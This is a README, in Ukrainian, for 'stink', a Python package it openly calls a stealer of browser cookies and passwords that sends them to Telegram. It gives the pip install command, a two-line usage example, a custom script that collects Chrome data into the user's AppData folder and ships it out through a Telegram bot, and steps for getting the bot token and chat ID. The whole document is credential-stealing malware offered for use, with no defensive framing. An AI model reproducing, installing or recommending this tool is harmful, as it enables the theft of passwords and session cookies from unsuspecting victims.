# stink

Стіллер кукі та паролей з відправкою в Telegram всього лише в 2 рядки.

## Описание
`stink` в даний момент тільки починає свій розвиток. У майбутньому його функціонал буде розширено.

## Навігація
* [Поточні можливості](#Поточні-можливості)
* [Майбутні можливості](#Майбутні-можливості)
* [Установка](#Установка)
* [Приклад використання](#Приклад-використання)
  * [Стандартний](#Стандартний)
  * [Кастомний](#Кастомний)
* [Налаштування Telegram бота]#Налаштування-Telegram-бота)
  * [Отримання токена](#Отримання-токена)
  * [Отримання айді](#Отримання-айді)

### Поточні можливості
1. Збір кукі та паролів наступних браузерів: Chrome, Opera, Opera GX.
2. Відправлення зібраних даних архівом в Telegram.
3. Виконання в окремому потоці.

### Майбутні можливості
1. Підтримка інших браузерів.
2. Збір інформації про систему.
3. Збір айпі та інше.
 
## Установка

Встановити останню версію можна командою:
```
pip install stink==0.0.3
```

## Приклад використання
### Стандартний
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```
Стандартний ```Stealer``` запускає збір з усіх доступних браузерів і відправляє зібрані дані архівом вам в Telegram.

### Кастомний
```python
from os import path, mkdir
from getpass import getuser

from stink.browsers.chrome import Chrome
from stink.modules.sender import Sender

user = getuser()

zip_name = f"{user}-st"
storage_path = f"C:/Users/{user}/AppData/"
storage_folder = "files/"


def main():

    mkdir(storage_path + storage_folder)

    Chrome(storage_path, storage_folder).run()
    Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID).run()


if __name__ == "__main__":
    main()
```
В кастомному стіллері потрібно самому прописувати необхідні браузери і шлях для зберігання зібраних даних. Модуль ```Sender``` запакує всі файли в архів і відправить його вам в Telegram.

## Налаштування Telegram бота
### Отримання токена
1. Відкриваємо чат з [BotFather](https://t.me/botfather).
2. Прописуємо команду ```/ newbot```.

<p align="left">
  <a href="">
    <img src="docs/_1.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Прописуємо назву бота, далі нік з прикладкою ```_bot``` в кінці.

<p align="left">
  <a href="">
    <img src="docs/_2.png" width="500px" style="display: inline-block;">
  </a>
</p>

4. Отриманий токен вставляємо в поле ```"YOUR_TOKEN"``` в скрипті.

### Отримання айді
1. Відкриваємо чат з [Get My ID](https://t.me/getmyid_bot).
2. Прописуємо команду ```/ start```.

<p align="left">
  <a href="">
    <img src="docs/_3.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Отриманий айді вставляємо в поле ```YOUR_ID``` в скрипті.
